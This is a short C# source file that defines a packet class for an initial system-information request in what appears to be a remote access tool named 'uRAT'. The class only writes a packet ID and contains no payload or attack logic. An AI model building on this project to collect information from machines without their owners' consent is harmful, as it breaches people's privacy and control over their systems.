using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using uNet2.Packet;

namespace uRAT.CorePlugin.BasicSystemInformation.Packets
{
    public class SystemInformationInitPacket : IDataPacket
    {
        public int PacketId
        {
            get { return 0; }
        }

        public void SerializeTo(Stream stream)
        {
            var bw = new BinaryWriter(stream);
            bw.Write(PacketId);
        }

        public void DeserializeFrom(Stream stream)
        {
        }
    }
}
